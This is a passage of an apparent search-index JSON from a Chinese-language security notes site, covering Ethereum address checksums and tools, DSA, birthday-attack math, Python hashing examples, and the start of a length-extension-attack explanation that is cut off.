\u21a9 https://www.jianshu.com/p/682c75b10392 \u21a9","title":"Ethereum \u57fa\u790e\u7bc7"},{"location":"security/crypto/blockchain/basics/#ens","text":"\u5c31\u8ddf DNS \u7684\u529f\u80fd\u4e00\u6a23\uff0c\u628a\u8907\u96dc\u7684\u5730\u5740\u5c0d\u61c9\u5230\u4e00\u500b human-readable \u7684\u5b57\u4e32\uff0c\u6bd4\u5982 buymecoffee.eth enslisting.com \u662f\u820a\u7684\u670d\u52d9\uff0c\u7528 5 day vickery auction \u4f86\u7af6\u6a19 manager.ens.domains \u662f\u65b0\u7684\u670d\u52d9\uff0c2019/05/04 \u4e0a\u7dda\uff0c\u4e0d\u7528\u518d\u7b49\u4e94\u5929\u7af6\u6a19\u9019\u9ebc\u4e45\u4e86 ENS \u7684\u672c\u9ad4\u5176\u5be6\u5c31\u662f\u4e00\u500b\u667a\u6167\u5408\u7d04\uff0c\u770b\u770b\u9019\u500b \u2192 ens","title":"ENS"},{"location":"security/crypto/blockchain/basics/#ethereum-address-checksum","text":"Ethereum \u7684\u4f4d\u5740\u662f\u7528\u5927\u5c0f\u5beb\u4f86\u7576 checksum\uff0c\u5982\u679c checksum \u932f\u4e86 web3 \u6703\u5674\u932f \u53ef\u4ee5\u53eb web3 \u5e6b\u4f60\u505a checksum web3.toChecksumAddress('ADDRESS')","title":"Ethereum Address Checksum"},{"location":"security/crypto/blockchain/basics/#1","text":"function toChecksumAddress () { let hash = keccak256 ( address ) let ans = '0x' for ( let i = 0 ; i < address . length ; i ++ ) { if ( parseInt ( hash [ i ], 16 ) >= 8 ) ans += address [ i ]. toUpperCase () else ans += address [ i ] } return ans }","title":"\u5be6\u4f5c\u865b\u64ec\u78bc1"},{"location":"security/crypto/blockchain/basics/#sha3-keccak256-2","text":"\u7c21\u55ae\u4f86\u8aaa Keccak256 \u662f\u6307\u539f\u672c\u7684 SHA3 SHA3 \u662f\u6307 NIST \u6a19\u6e96\u7684 SHA3 https://github.com/ethereum/EIPs/blob/master/EIPS/eip-55.md#implementation \u21a9 https://www.jianshu.com/p/682c75b10392 \u21a9","title":"SHA3 \u8207 Keccak256 \u7684\u5340\u52252"},{"location":"security/crypto/blockchain/tools/","text":"MetaMask \u597d\u7528\u7684\u7ba1\u7406\u9322\u5305\u7684\u63d2\u4ef6\uff0c\u5e6b\u4f60\u7c3d\u7f72\u4ea4\u6613 \u5728\u4f7f\u7528\u5176\u4ed6\u7dda\u4e0a\u5de5\u5177\u6216\u7db2\u7ad9\u7684\u6642\u5019\uff0c\u90a3\u4e9b\u7db2\u7ad9\u5c31\u53ea\u662f\u5305\u597d\u4ea4\u6613\u5167\u5bb9\u7136\u5f8c\u547c\u53eb MetaMask \u7528\u4f60\u7684\u79c1\u9470\u7c3d\u7f72\u4ea4\u6613 MEW \u53ef\u4ee5\u767c\u9322\u6216\u662f\u5275\u5efa\u5408\u7d04\u8ddf\u5408\u7d04\u4e92\u52d5\uff0c\u548c\u4ee5\u592a\u934a\u6e9d\u901a\u7684\u524d\u7aef\u4ecb\u9762 \u4e0d\u904e\u9019\u500b\u5de5\u5177\u6709\u4e9b bug\uff0c\u6bd4\u5982\u5408\u7d04\u547c\u53eb payable \u51fd\u5f0f\u7684\u6642\u5019\uff0c\u9322\u767c\u4e0d\u51fa\u53bb MyCrypto \u8ddf MEW \u540c\u6027\u8cea\u7684\u5de5\u5177 remix.ethereum.org \u7dda\u4e0a\u7684 solidity IDE \u633a\u597d\u7528\u7684\u4e0d\u904e\u754c\u9762\u633a\u919c\u7684\uff0c\u4ed6\u6700\u8fd1\u6709\u65b0\u672c\u7684\u4ecb\u9762\uff0c\u4e0d\u904e\u6709\u4e9b bug \u9084\u4e0d\u592a\u7a69\u5b9a\u7684\u6a23\u5b50\uff08\u89c0\u671b web3.js Ethereum JavaScript API","title":"Ethereum \u5de5\u5177\u7bc7"},{"location":"security/crypto/blockchain/tools/#metamask","text":"\u597d\u7528\u7684\u7ba1\u7406\u9322\u5305\u7684\u63d2\u4ef6\uff0c\u5e6b\u4f60\u7c3d\u7f72\u4ea4\u6613 \u5728\u4f7f\u7528\u5176\u4ed6\u7dda\u4e0a\u5de5\u5177\u6216\u7db2\u7ad9\u7684\u6642\u5019\uff0c\u90a3\u4e9b\u7db2\u7ad9\u5c31\u53ea\u662f\u5305\u597d\u4ea4\u6613\u5167\u5bb9\u7136\u5f8c\u547c\u53eb MetaMask \u7528\u4f60\u7684\u79c1\u9470\u7c3d\u7f72\u4ea4\u6613","title":"MetaMask"},{"location":"security/crypto/blockchain/tools/#mew","text":"\u53ef\u4ee5\u767c\u9322\u6216\u662f\u5275\u5efa\u5408\u7d04\u8ddf\u5408\u7d04\u4e92\u52d5\uff0c\u548c\u4ee5\u592a\u934a\u6e9d\u901a\u7684\u524d\u7aef\u4ecb\u9762 \u4e0d\u904e\u9019\u500b\u5de5\u5177\u6709\u4e9b bug\uff0c\u6bd4\u5982\u5408\u7d04\u547c\u53eb payable \u51fd\u5f0f\u7684\u6642\u5019\uff0c\u9322\u767c\u4e0d\u51fa\u53bb","title":"MEW"},{"location":"security/crypto/blockchain/tools/#mycrypto","text":"\u8ddf MEW \u540c\u6027\u8cea\u7684\u5de5\u5177","title":"MyCrypto"},{"location":"security/crypto/blockchain/tools/#remixethereumorg","text":"\u7dda\u4e0a\u7684 solidity IDE \u633a\u597d\u7528\u7684\u4e0d\u904e\u754c\u9762\u633a\u919c\u7684\uff0c\u4ed6\u6700\u8fd1\u6709\u65b0\u672c\u7684\u4ecb\u9762\uff0c\u4e0d\u904e\u6709\u4e9b bug \u9084\u4e0d\u592a\u7a69\u5b9a\u7684\u6a23\u5b50\uff08\u89c0\u671b","title":"remix.ethereum.org"},{"location":"security/crypto/blockchain/tools/#web3js","text":"Ethereum JavaScript API","title":"web3.js"},{"location":"security/crypto/classic/beast/","text":"","title":"BEAST Attack"},{"location":"security/crypto/classic/dual-ec/","text":"Dual EC DRBG Backdoor TODO \u76f8\u95dc\u8cc7\u6e90 https://www.youtube.com/watch?v=OkiVN6z60lg https://www.youtube.com/watch?v=nybVFJVXbww&t=502s https://projectbullrun.org/dual-ec/documents/dual-ec-20150731.pdf","title":"Dual EC DRBG Backdoor"},{"location":"security/crypto/classic/dual-ec/#dual-ec-drbg-backdoor","text":"TODO","title":"Dual EC DRBG Backdoor"},{"location":"security/crypto/classic/dual-ec/#_1","text":"https://www.youtube.com/watch?v=OkiVN6z60lg https://www.youtube.com/watch?v=nybVFJVXbww&t=502s https://projectbullrun.org/dual-ec/documents/dual-ec-20150731.pdf","title":"\u76f8\u95dc\u8cc7\u6e90"},{"location":"security/crypto/classic/poodle/","text":"","title":"POODLE Attack"},{"location":"security/crypto/digital-signature/dsa-known-partial-nonce/","text":"DSA Known Partial Nonce Attack CTF \u984c\u76ee DEFCON CTF QUALS 2018 - official \u76f8\u95dc\u8cc7\u6e90 https://crypto.stackexchange.com/questions/44644/how-does-the-biased-k-attack-on-ecdsa-work https://pdfs.semanticscholar.org/b2ba/95d5155df3a56e32fbb8320df8a197bfe1e0.pdf http://www.hpl.hp.com/techreports/1999/HPL-1999-90.pdf","title":"DSA Known Partial Nonce Attack"},{"location":"security/crypto/digital-signature/dsa-known-partial-nonce/#dsa-known-partial-nonce-attack","text":"","title":"DSA Known Partial Nonce Attack"},{"location":"security/crypto/digital-signature/dsa-known-partial-nonce/#ctf","text":"DEFCON CTF QUALS 2018 - official","title":"CTF \u984c\u76ee"},{"location":"security/crypto/digital-signature/dsa-known-partial-nonce/#_1","text":"https://crypto.stackexchange.com/questions/44644/how-does-the-biased-k-attack-on-ecdsa-work https://pdfs.semanticscholar.org/b2ba/95d5155df3a56e32fbb8320df8a197bfe1e0.pdf http://www.hpl.hp.com/techreports/1999/HPL-1999-90.pdf","title":"\u76f8\u95dc\u8cc7\u6e90"},{"location":"security/crypto/digital-signature/dsa/","text":"Digital Signature Algorithm ( DSA ) \u660e\u6587 m m Key Generation General Parameters \u9078\u4e00\u500b hash function H H \uff0c\u4f8b\u5982 : SHA1 \u9078\u4e00\u500b\u8cea\u6578 p p \u9078\u4e00\u500b\u8cea\u6578 q q \uff0c\u4f7f\u5f97 p - 1 p - 1 \u662f q q \u7684\u500d\u6578 \u9078\u4e00\u500b g \\in \\mathbb{Z}_p^* g \\in \\mathbb{Z}_p^* \uff0c g g \u7684 order \u662f q q \uff0c\u4e5f\u5c31\u662f q q \u662f\u6700\u5c0f\u7684\u6b63\u6574\u6578 g^q \\equiv 1 \\pmod{p} g^q \\equiv 1 \\pmod{p} Private Key \u9078\u4e00\u500b\u6574\u6578 x ( 0 < x < q 0 < x < q ) Public Key y = g^x \\mod{p} y = g^x \\mod{p} Sign \u7522\u751f random nonce k k ( 1 < k < q 1 < k < q ) r = (g^k \\mod{p}) \\mod{q} r = (g^k \\mod{p}) \\mod{q} ( \u5982\u679c r = 0 r = 0 \uff0c\u518d\u7522\u751f\u4e00\u6b21 k k ) s = k^{-1}(H(m) + xr) \\mod{q} s = k^{-1}(H(m) + xr) \\mod{q} ( \u5982\u679c s = 0 s = 0 \uff0c\u518d\u7522\u751f\u4e00\u6b21 k k ) signature = (r, s) Verify w = s^{-1} \\mod{q} w = s^{-1} \\mod{q} u_1 = H(m)w \\mod{q} u_1 = H(m)w \\mod{q} u_2 = rw \\mod{q} u_2 = rw \\mod{q} v = g^{u_1}y^{u_2} \\mod{q} v = g^{u_1}y^{u_2} \\mod{q} verify v = r Proof of Correctness s = k^{-1}(H(m) + xr) \\mod{q} s = k^{-1}(H(m) + xr) \\mod{q} \\begin{align} k & \\equiv H(m)s^{-1}+xrs^{-1}\\\\ & \\equiv H(m)w + xrw \\pmod{q} \\end{align} \\begin{align} k & \\equiv H(m)s^{-1}+xrs^{-1}\\\\ & \\equiv H(m)w + xrw \\pmod{q} \\end{align} \u56e0\u70ba\u6211\u5011\u9078 p, q, g p, q, g \u7684\u65b9\u5f0f\uff0c g^q \\equiv 1 \\pmod{p} g^q \\equiv 1 \\pmod{p} \uff0c\u6240\u4ee5\u5c0d\u4efb\u610f\u7684 a a \u6211\u5011\u53ef\u4ee5 g^a \\equiv g^{a \\mod{q}} \\pmod{p} g^a \\equiv g^{a \\mod{q}} \\pmod{p} {\\displaystyle {\\begin{aligned}g^{k}&\\equiv g^{H(m)w}g^{xrw}\\\\&\\equiv g^{H(m)w}y^{rw}\\\\&\\equiv g^{u_{1}}y^{u_{2}}{\\pmod {p}}\\end{aligned}}} {\\displaystyle {\\begin{aligned}g^{k}&\\equiv g^{H(m)w}g^{xrw}\\\\&\\equiv g^{H(m)w}y^{rw}\\\\&\\equiv g^{u_{1}}y^{u_{2}}{\\pmod {p}}\\end{aligned}}} {\\displaystyle {\\begin{aligned}r&=(g^{k}{\\bmod {\\,}}p){\\bmod {\\,}}q\\\\&=(g^{u_{1}}y^{u_{2}}{\\bmod {\\,}}p){\\bmod {\\,}}q\\\\&=v\\end{aligned}}} {\\displaystyle {\\begin{aligned}r&=(g^{k}{\\bmod {\\,}}p){\\bmod {\\,}}q\\\\&=(g^{u_{1}}y^{u_{2}}{\\bmod {\\,}}p){\\bmod {\\,}}q\\\\&=v\\end{aligned}}} \u76f8\u95dc\u8cc7\u6e90 wiki \u5beb\u7684\u5f88\u8a73\u7d30 https://en.wikipedia.org/wiki/Digital_Signature_Algorithm","title":"DSA"},{"location":"security/crypto/digital-signature/dsa/#digital-signature-algorithm-dsa","text":"\u660e\u6587 m m","title":"Digital Signature Algorithm ( DSA )"},{"location":"security/crypto/digital-signature/dsa/#key-generation","text":"","title":"Key Generation"},{"location":"security/crypto/digital-signature/dsa/#general-parameters","text":"\u9078\u4e00\u500b hash function H H \uff0c\u4f8b\u5982 : SHA1 \u9078\u4e00\u500b\u8cea\u6578 p p \u9078\u4e00\u500b\u8cea\u6578 q q \uff0c\u4f7f\u5f97 p - 1 p - 1 \u662f q q \u7684\u500d\u6578 \u9078\u4e00\u500b g \\in \\mathbb{Z}_p^* g \\in \\mathbb{Z}_p^* \uff0c g g \u7684 order \u662f q q \uff0c\u4e5f\u5c31\u662f q q \u662f\u6700\u5c0f\u7684\u6b63\u6574\u6578 g^q \\equiv 1 \\pmod{p} g^q \\equiv 1 \\pmod{p}","title":"General Parameters"},{"location":"security/crypto/digital-signature/dsa/#private-key","text":"\u9078\u4e00\u500b\u6574\u6578 x ( 0 < x < q 0 < x < q )","title":"Private Key"},{"location":"security/crypto/digital-signature/dsa/#public-key","text":"y = g^x \\mod{p} y = g^x \\mod{p}","title":"Public Key"},{"location":"security/crypto/digital-signature/dsa/#sign","text":"\u7522\u751f random nonce k k ( 1 < k < q 1 < k < q ) r = (g^k \\mod{p}) \\mod{q} r = (g^k \\mod{p}) \\mod{q} ( \u5982\u679c r = 0 r = 0 \uff0c\u518d\u7522\u751f\u4e00\u6b21 k k ) s = k^{-1}(H(m) + xr) \\mod{q} s = k^{-1}(H(m) + xr) \\mod{q} ( \u5982\u679c s = 0 s = 0 \uff0c\u518d\u7522\u751f\u4e00\u6b21 k k ) signature = (r, s)","title":"Sign"},{"location":"security/crypto/digital-signature/dsa/#verify","text":"w = s^{-1} \\mod{q} w = s^{-1} \\mod{q} u_1 = H(m)w \\mod{q} u_1 = H(m)w \\mod{q} u_2 = rw \\mod{q} u_2 = rw \\mod{q} v = g^{u_1}y^{u_2} \\mod{q} v = g^{u_1}y^{u_2} \\mod{q} verify v = r","title":"Verify"},{"location":"security/crypto/digital-signature/dsa/#proof-of-correctness","text":"s = k^{-1}(H(m) + xr) \\mod{q} s = k^{-1}(H(m) + xr) \\mod{q} \\begin{align} k & \\equiv H(m)s^{-1}+xrs^{-1}\\\\ & \\equiv H(m)w + xrw \\pmod{q} \\end{align} \\begin{align} k & \\equiv H(m)s^{-1}+xrs^{-1}\\\\ & \\equiv H(m)w + xrw \\pmod{q} \\end{align} \u56e0\u70ba\u6211\u5011\u9078 p, q, g p, q, g \u7684\u65b9\u5f0f\uff0c g^q \\equiv 1 \\pmod{p} g^q \\equiv 1 \\pmod{p} \uff0c\u6240\u4ee5\u5c0d\u4efb\u610f\u7684 a a \u6211\u5011\u53ef\u4ee5 g^a \\equiv g^{a \\mod{q}} \\pmod{p} g^a \\equiv g^{a \\mod{q}} \\pmod{p} {\\displaystyle {\\begin{aligned}g^{k}&\\equiv g^{H(m)w}g^{xrw}\\\\&\\equiv g^{H(m)w}y^{rw}\\\\&\\equiv g^{u_{1}}y^{u_{2}}{\\pmod {p}}\\end{aligned}}} {\\displaystyle {\\begin{aligned}g^{k}&\\equiv g^{H(m)w}g^{xrw}\\\\&\\equiv g^{H(m)w}y^{rw}\\\\&\\equiv g^{u_{1}}y^{u_{2}}{\\pmod {p}}\\end{aligned}}} {\\displaystyle {\\begin{aligned}r&=(g^{k}{\\bmod {\\,}}p){\\bmod {\\,}}q\\\\&=(g^{u_{1}}y^{u_{2}}{\\bmod {\\,}}p){\\bmod {\\,}}q\\\\&=v\\end{aligned}}} {\\displaystyle {\\begin{aligned}r&=(g^{k}{\\bmod {\\,}}p){\\bmod {\\,}}q\\\\&=(g^{u_{1}}y^{u_{2}}{\\bmod {\\,}}p){\\bmod {\\,}}q\\\\&=v\\end{aligned}}}","title":"Proof of Correctness"},{"location":"security/crypto/digital-signature/dsa/#_1","text":"wiki \u5beb\u7684\u5f88\u8a73\u7d30 https://en.wikipedia.org/wiki/Digital_Signature_Algorithm","title":"\u76f8\u95dc\u8cc7\u6e90"},{"location":"security/crypto/digital-signature/ecdsa/","text":"Elliptic Curve Digital Signature Algorithm ( ECDSA )","title":"ECDSA"},{"location":"security/crypto/digital-signature/ecdsa/#elliptic-curve-digital-signature-algorithm-ecdsa","text":"","title":"Elliptic Curve Digital Signature Algorithm ( ECDSA )"},{"location":"security/crypto/hash/birthday-attack/","text":"Birthday Attack birthday attack \u4e3b\u8981\u662f\u7528 birthday paradox \u4f30\u7b97\u66b4\u529b\u5c0b\u627e collision \u9700\u8981\u591a\u5c11\u6642\u9593 \u539f\u7406 \u6709 n n \u500b\u4eba\uff0c\u6bcf\u500b\u4eba\u90fd\u53ef\u4ee5\u5f9e\u5927\u5c0f\u70ba m m \u7684\u96c6\u5408\u4e2d\u62ff\u51fa\u4e00\u500b\u5143\u7d20 p(n, m) p(n, m) \u8868\u793a\u6709\u5169\u500b\u4eba\u9078\u64c7\u76f8\u540c\u7684\u6578\u5b57\u7684\u6a5f\u7387 ( \u7b49\u540c\u65bc\u78b0\u649e\u7684\u6a5f\u7387 ) \\overline{p}(n, m) \\overline{p}(n, m) \u8868\u793a\u4efb\u5169\u500b\u4eba\u9078\u64c7\u7684\u6578\u5b57\u90fd\u4e0d\u76f8\u540c\u7684\u6a5f\u7387 \u986f\u7136\u7684\uff0c p(n, m) = 1 - \\overline{p}(n, m) p(n, m) = 1 - \\overline{p}(n, m) \\overline{p}(n, m) = \\frac{m}{m} \\cdot \\frac{m-1}{m} \\cdots \\frac{m - (n - 1)}{m} = \\frac{m!}{m^n(m-n)!} \\overline{p}(n, m) = \\frac{m}{m} \\cdot \\frac{m-1}{m} \\cdots \\frac{m - (n - 1)}{m} = \\frac{m!}{m^n(m-n)!} p(n, m) = 1 - \\frac{m!}{m^n(m-n)!} p(n, m) = 1 - \\frac{m!}{m^n(m-n)!} \u4f30\u7b97 \u63a5\u4e0b\u4f86\u6211\u5011\u7528 First order approximation of Taylor series expansion of e^x e^x \u4f86\u4f30\u7b97 p(n, m) p(n, m) e^x \\approx 1 + x e^x \\approx 1 + x p(n, m) = 1 - (1 - \\frac{0}{m})(1 - \\frac{1}{m}) \\cdots (1 - \\frac{n-1}{m}) \\approx 1 - e^{-\\frac{0}{m}}e^{-\\frac{1}{m}} \\cdots e^{-\\frac{n-1}{m}} = 1 - e^{-\\frac{n(n-1)}{2m}} \\approx 1 - e^{-\\frac{n^2}{2m}} p(n, m) = 1 - (1 - \\frac{0}{m})(1 - \\frac{1}{m}) \\cdots (1 - \\frac{n-1}{m}) \\approx 1 - e^{-\\frac{0}{m}}e^{-\\frac{1}{m}} \\cdots e^{-\\frac{n-1}{m}} = 1 - e^{-\\frac{n(n-1)}{2m}} \\approx 1 - e^{-\\frac{n^2}{2m}} \u5047\u8a2d\u6211\u5011\u60f3\u8981 p(n, m) = \\frac{1}{2} p(n, m) = \\frac{1}{2} ( 50% ) \\frac{1}{2} = 1 - e^{-\\frac{n^2}{2m}} \\frac{1}{2} = 1 - e^{-\\frac{n^2}{2m}} e^{-\\frac{n^2}{2m}} = \\frac{1}{2} e^{-\\frac{n^2}{2m}} = \\frac{1}{2} -\\frac{n^2}{2m} = -ln(2) -\\frac{n^2}{2m} = -ln(2) n = \\sqrt{(2ln(2))m} \\approx \\sqrt{m} n = \\sqrt{(2ln(2))m} \\approx \\sqrt{m} \u5047\u8a2d\u6211\u5011\u60f3\u8981 p(n, m) = \\frac{99}{100} p(n, m) = \\frac{99}{100} ( 99% )\uff0c n = \\sqrt{(2ln(100))m} \\approx 3\\sqrt{m} n = \\sqrt{(2ln(100))m} \\approx 3\\sqrt{m} \u4e5f\u5c31\u662f\u8aaa\u5047\u8a2d\u6211\u5011\u6709\u4e00\u500b\u9577\u5ea6\u662f a a bits \u7684 hash function\uff0c\u6211\u5011\u53ea\u9700\u8981\u5927\u7d04 \\sqrt{2^a} = 2^{a/2} \\sqrt{2^a} = 2^{a/2} \u500b\u9078\u64c7\u5c31\u5f88\u6709\u53ef\u80fd\u627e\u5230\u4e00\u7d44 collision Find collision with constant space \u5047\u8a2d\u6211\u5011\u8981\u627e\u4e00\u500b\u9577\u5ea6\u662f 64 bits \u7684 hash function \u7684 collision \u6839\u64da birthday paradox \u6211\u5011\u5728\u7522\u751f 3\\sqrt{2^{64}} = 12884901888 \\approx 10^{10} 3\\sqrt{2^{64}} = 12884901888 \\approx 10^{10} \u500b hash value \u4e4b\u5f8c\u6709 99% \u7684\u6a5f\u6703\u627e\u5230 collision \u5047\u8a2d\u96fb\u8166\u4e00\u79d2\u53ef\u4ee5\u8dd1 10^{8} 10^{8} \u6b21\u904b\u7b97 ( \u7528 C/C++ \u5dee\u4e0d\u591a\u9019\u500b\u901f\u5ea6 )\uff0c\u6211\u5011\u9700\u8981 100 \u79d2\uff0c\u4e5f\u5c31\u662f\u5927\u7d04 2 \u5206\u9418\u4e0d\u5230\u5c31\u53ef\u4ee5\u627e\u5230\u4e86 \u4f46\u662f\u6211\u5011\u5fc5\u9808\u5b58\u4e00\u500b\u5f88\u5927\u7684\u8868\uff0c\u628a\u6240\u6709\u7522\u751f\u7684 hash value \u8a18\u4e0b\u4f86 ( 2^{64} 2^{64} bits = 2 EB ) \u9019\u908a\u7684 stackexchange \u548c paper \u6709\u8b1b\u5230\u4e00\u500b\u53ea\u9700\u8981\u7528 constant \u7684\u7a7a\u9593\u5c31\u53ef\u4ee5\u505a birthday attack \u7684\u65b9\u6cd5 ( \u5176\u5be6\u5c31\u662f\u7528 Floyd's Tortoise and Hare \u505a cycle detection )","title":"Birthday Attack"},{"location":"security/crypto/hash/birthday-attack/#birthday-attack","text":"birthday attack \u4e3b\u8981\u662f\u7528 birthday paradox \u4f30\u7b97\u66b4\u529b\u5c0b\u627e collision \u9700\u8981\u591a\u5c11\u6642\u9593","title":"Birthday Attack"},{"location":"security/crypto/hash/birthday-attack/#_1","text":"\u6709 n n \u500b\u4eba\uff0c\u6bcf\u500b\u4eba\u90fd\u53ef\u4ee5\u5f9e\u5927\u5c0f\u70ba m m \u7684\u96c6\u5408\u4e2d\u62ff\u51fa\u4e00\u500b\u5143\u7d20 p(n, m) p(n, m) \u8868\u793a\u6709\u5169\u500b\u4eba\u9078\u64c7\u76f8\u540c\u7684\u6578\u5b57\u7684\u6a5f\u7387 ( \u7b49\u540c\u65bc\u78b0\u649e\u7684\u6a5f\u7387 ) \\overline{p}(n, m) \\overline{p}(n, m) \u8868\u793a\u4efb\u5169\u500b\u4eba\u9078\u64c7\u7684\u6578\u5b57\u90fd\u4e0d\u76f8\u540c\u7684\u6a5f\u7387 \u986f\u7136\u7684\uff0c p(n, m) = 1 - \\overline{p}(n, m) p(n, m) = 1 - \\overline{p}(n, m) \\overline{p}(n, m) = \\frac{m}{m} \\cdot \\frac{m-1}{m} \\cdots \\frac{m - (n - 1)}{m} = \\frac{m!}{m^n(m-n)!} \\overline{p}(n, m) = \\frac{m}{m} \\cdot \\frac{m-1}{m} \\cdots \\frac{m - (n - 1)}{m} = \\frac{m!}{m^n(m-n)!} p(n, m) = 1 - \\frac{m!}{m^n(m-n)!} p(n, m) = 1 - \\frac{m!}{m^n(m-n)!}","title":"\u539f\u7406"},{"location":"security/crypto/hash/birthday-attack/#_2","text":"\u63a5\u4e0b\u4f86\u6211\u5011\u7528 First order approximation of Taylor series expansion of e^x e^x \u4f86\u4f30\u7b97 p(n, m) p(n, m) e^x \\approx 1 + x e^x \\approx 1 + x p(n, m) = 1 - (1 - \\frac{0}{m})(1 - \\frac{1}{m}) \\cdots (1 - \\frac{n-1}{m}) \\approx 1 - e^{-\\frac{0}{m}}e^{-\\frac{1}{m}} \\cdots e^{-\\frac{n-1}{m}} = 1 - e^{-\\frac{n(n-1)}{2m}} \\approx 1 - e^{-\\frac{n^2}{2m}} p(n, m) = 1 - (1 - \\frac{0}{m})(1 - \\frac{1}{m}) \\cdots (1 - \\frac{n-1}{m}) \\approx 1 - e^{-\\frac{0}{m}}e^{-\\frac{1}{m}} \\cdots e^{-\\frac{n-1}{m}} = 1 - e^{-\\frac{n(n-1)}{2m}} \\approx 1 - e^{-\\frac{n^2}{2m}} \u5047\u8a2d\u6211\u5011\u60f3\u8981 p(n, m) = \\frac{1}{2} p(n, m) = \\frac{1}{2} ( 50% ) \\frac{1}{2} = 1 - e^{-\\frac{n^2}{2m}} \\frac{1}{2} = 1 - e^{-\\frac{n^2}{2m}} e^{-\\frac{n^2}{2m}} = \\frac{1}{2} e^{-\\frac{n^2}{2m}} = \\frac{1}{2} -\\frac{n^2}{2m} = -ln(2) -\\frac{n^2}{2m} = -ln(2) n = \\sqrt{(2ln(2))m} \\approx \\sqrt{m} n = \\sqrt{(2ln(2))m} \\approx \\sqrt{m} \u5047\u8a2d\u6211\u5011\u60f3\u8981 p(n, m) = \\frac{99}{100} p(n, m) = \\frac{99}{100} ( 99% )\uff0c n = \\sqrt{(2ln(100))m} \\approx 3\\sqrt{m} n = \\sqrt{(2ln(100))m} \\approx 3\\sqrt{m} \u4e5f\u5c31\u662f\u8aaa\u5047\u8a2d\u6211\u5011\u6709\u4e00\u500b\u9577\u5ea6\u662f a a bits \u7684 hash function\uff0c\u6211\u5011\u53ea\u9700\u8981\u5927\u7d04 \\sqrt{2^a} = 2^{a/2} \\sqrt{2^a} = 2^{a/2} \u500b\u9078\u64c7\u5c31\u5f88\u6709\u53ef\u80fd\u627e\u5230\u4e00\u7d44 collision","title":"\u4f30\u7b97"},{"location":"security/crypto/hash/birthday-attack/#find-collision-with-constant-space","text":"\u5047\u8a2d\u6211\u5011\u8981\u627e\u4e00\u500b\u9577\u5ea6\u662f 64 bits \u7684 hash function \u7684 collision \u6839\u64da birthday paradox \u6211\u5011\u5728\u7522\u751f 3\\sqrt{2^{64}} = 12884901888 \\approx 10^{10} 3\\sqrt{2^{64}} = 12884901888 \\approx 10^{10} \u500b hash value \u4e4b\u5f8c\u6709 99% \u7684\u6a5f\u6703\u627e\u5230 collision \u5047\u8a2d\u96fb\u8166\u4e00\u79d2\u53ef\u4ee5\u8dd1 10^{8} 10^{8} \u6b21\u904b\u7b97 ( \u7528 C/C++ \u5dee\u4e0d\u591a\u9019\u500b\u901f\u5ea6 )\uff0c\u6211\u5011\u9700\u8981 100 \u79d2\uff0c\u4e5f\u5c31\u662f\u5927\u7d04 2 \u5206\u9418\u4e0d\u5230\u5c31\u53ef\u4ee5\u627e\u5230\u4e86 \u4f46\u662f\u6211\u5011\u5fc5\u9808\u5b58\u4e00\u500b\u5f88\u5927\u7684\u8868\uff0c\u628a\u6240\u6709\u7522\u751f\u7684 hash value \u8a18\u4e0b\u4f86 ( 2^{64} 2^{64} bits = 2 EB ) \u9019\u908a\u7684 stackexchange \u548c paper \u6709\u8b1b\u5230\u4e00\u500b\u53ea\u9700\u8981\u7528 constant \u7684\u7a7a\u9593\u5c31\u53ef\u4ee5\u505a birthday attack \u7684\u65b9\u6cd5 ( \u5176\u5be6\u5c31\u662f\u7528 Floyd's Tortoise and Hare \u505a cycle detection )","title":"Find collision with constant space"},{"location":"security/crypto/hash/implementation/","text":"\u5be6\u505a command line md5sum file \u9084\u6709 shasum , sha1sum , sha224sum , sha256sum , sha384sum , sha512sum shasum \u7b49\u65bc sha1sum python \u4ee5\u4e0b\u7528 md5 \u505a\u4f8b\u5b50\uff0c\u5176\u4ed6\u540c\u7406 hashlib import hashlib hashlib . md5 ( b 'OAlienO' ) . digest () # b's\\xf8*\\xe7\\x1f*V!\\xf1\\x1aa(\\xae\\x92xw' hashlib . md5 ( b 'OAlienO' ) . hexdigest () # '73f82ae71f2a5621f11a6128ae927877' pycrypto from Crypto.Hash import MD5 MD5 . new ( b 'OAlienO' ) . digest () # b's\\xf8*\\xe7\\x1f*V!\\xf1\\x1aa(\\xae\\x92xw' MD5 . new ( b 'OAlienO' ) . hexdigest () # '73f82ae71f2a5621f11a6128ae927877'","title":"\u5be6\u505a"},{"location":"security/crypto/hash/implementation/#_1","text":"","title":"\u5be6\u505a"},{"location":"security/crypto/hash/implementation/#command-line","text":"md5sum file \u9084\u6709 shasum , sha1sum , sha224sum , sha256sum , sha384sum , sha512sum shasum \u7b49\u65bc sha1sum","title":"command line"},{"location":"security/crypto/hash/implementation/#python","text":"\u4ee5\u4e0b\u7528 md5 \u505a\u4f8b\u5b50\uff0c\u5176\u4ed6\u540c\u7406","title":"python"},{"location":"security/crypto/hash/implementation/#hashlib","text":"import hashlib hashlib . md5 ( b 'OAlienO' ) . digest () # b's\\xf8*\\xe7\\x1f*V!\\xf1\\x1aa(\\xae\\x92xw' hashlib . md5 ( b 'OAlienO' ) . hexdigest () # '73f82ae71f2a5621f11a6128ae927877'","title":"hashlib"},{"location":"security/crypto/hash/implementation/#pycrypto","text":"from Crypto.Hash import MD5 MD5 . new ( b 'OAlienO' ) . digest () # b's\\xf8*\\xe7\\x1f*V!\\xf1\\x1aa(\\xae\\x92xw' MD5 . new ( b 'OAlienO' ) . hexdigest () # '73f82ae71f2a5621f11a6128ae927877'","title":"pycrypto"},{"location":"security/crypto/hash/length-extension-attack/","text":"Length Extension Attack ( LEA ) \u9019\u500b\u653b\u64ca\u9069\u7528\u65bc Merkle\u2013Damg\u00e5rd Construction \u985e\u578b\u7684 hash function H H \u7576 MAC \u9a57\u8b49\u6f14\u7b97\u6cd5\u662f H(salt || message) H(salt || message) ( || || \u662f\u5b57\u4e32\u4e32\u63a5 ) \u6211\u5011\u53ef\u4ee5\u7e5e\u904e MAC \u9a57\u8b49\u6a5f\u5236\u7684\u4fdd\u8b77\uff0c \u5c0d\u660e\u6587\u4e32\u63a5\u90e8\u5206\u8cc7\u6599 \u9650\u5236 \u9700\u8981\u77e5\u9053 message message \u548c H(salt || message) H(salt || message) \u548c salt || message salt || message \u7684\u9577\u5ea6 \u539f\u7406 \u6211\u5011\u8981\u7e5e\u904e MAC \u9a57\u8b49\u6a5f\u5236\uff0c\u5176\u5be6\u5c31\u662f\u5728\u6539\u52d5\u660e\u6587\u5f8c\u91cd\u65b0\u8a08\u7b97\u9a57\u8b49\u78bc \u8981\u91cd\u65b0\u8a08\u7b97\u5f88\u7c21\u55ae\uff0c\u6211\u5011\u628a H(salt || message) H(salt || message) \u7576\u4f5c\u65b0\u7684 IV' IV' 